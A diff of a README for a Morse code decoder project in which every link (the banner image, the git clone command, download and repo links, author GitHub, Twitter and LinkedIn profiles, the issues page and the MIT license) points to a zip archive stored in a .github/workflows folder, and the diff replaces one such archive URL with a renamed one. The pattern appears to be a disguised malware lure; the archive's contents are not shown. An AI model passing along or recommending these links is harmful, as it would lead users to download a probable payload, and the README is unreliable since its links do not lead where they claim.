@@ -1,4 +1,4 @@
-![](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
+![](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
 
 # Decode Morse Code
 
@@ -23,7 +23,7 @@ To get a local copy up and running follow these simple example steps.
 - Clone the project
 
 ```bash 
-git clone https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip
+git clone https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip
 
 cd decode-morse-code
 ```
@@ -38,32 +38,32 @@ run the program functions
 
 ## Visit And Open Files
 
-[Visit Repo](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
+[Visit Repo](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
 
 ## Download Repo
 
-[Download Repo](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
+[Download Repo](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
 
 ## Authors
 
 👤 **Iptisam Mukadam**
 
-- GitHub: [@iptisam](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
-- Twitter: [@twitter](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
-- LinkedIn: [@linkedin](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
+- GitHub: [@iptisam](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
+- Twitter: [@twitter](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
+- LinkedIn: [@linkedin](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
 
 👤 **Abdimulhin Adan**
 
-- GitHub: [@AbdimulhinYussuf3675](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
-- Twitter: [@abdimulhin](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
-- LinkedIn: [Abdimulhin Adan](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip)
+- GitHub: [@AbdimulhinYussuf3675](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
+- Twitter: [@abdimulhin](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
+- LinkedIn: [Abdimulhin Adan](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip)
 
 
 ## 🤝 Contributing
 
 Contributions, issues, and feature requests are welcome!
 
-Feel free to check the [issues page](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip).
+Feel free to check the [issues page](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip).
 
 ## Show your support
 
@@ -75,4 +75,4 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](https://raw.githubusercontent.com/Iptysam/Decode-Morse-Message/dev/.github/workflows/Morse_Decode_Message_v1.0.zip) licensed.
+This project is [MIT](https://github.com/Iptysam/Decode-Morse-Message/raw/refs/heads/dev/.github/workflows/Message_Decode_Morse_1.3-alpha.3.zip) licensed.
